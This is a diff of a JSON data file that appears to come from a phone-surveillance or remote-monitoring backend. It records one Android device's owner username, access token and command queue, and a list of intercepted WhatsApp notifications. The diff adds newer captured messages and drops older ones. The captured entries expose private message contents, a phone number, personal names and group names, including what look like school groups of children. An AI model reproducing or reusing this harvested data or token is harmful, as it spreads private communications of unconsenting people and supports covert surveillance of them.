@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776946875103,
+    "lastSeen": 1776946907844,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -9971,6 +9971,22 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎213 pesan dari 5 chat",
+        "time": "23/04 20:21",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776946877232
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎Senam Rappocini (21 pesan): ~ andirina0502",
+        "content": "Besok kalau saya telat datng di lokasi terus ada tegurki apakah satpol atau lainx... bilang komunitasx ibu lurah, hj Andi Rina ...Krn TDK sembarang org masuk di situ kalau mau senam harus ada ijin...",
+        "time": "23/04 20:21",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776946877213
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "+62 858-4757-8445",
         "content": "Memberi reaksi 👍 pada \"Minta maaf sy tdk jdi ikut  nonton  berhubung  ad urusan  penting  syg , sekali lgi sy minta maaf  🙏🙏\"",
         "time": "23/04 20:21",
@@ -13952,22 +13968,6 @@
         "time": "23/04 12:10",
         "pkg": "com.whatsapp",
         "receivedAt": 1776917434803
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎Class 8.10 ‼️ (79 pesan): ~ VianBakri",
-        "content": "Jln mi dulu",
-        "time": "23/04 12:10",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776917434741
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎ALUMNI SDN RAPPOCINI KELAS ANGKATAN 2023-2024🫂💗 (107 pesan): ~ მႮჁმ",
-        "content": "mau ka pergi latihan",
-        "time": "23/04 12:10",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776917434686
       }
     ],
     "galleryPhotos": [],
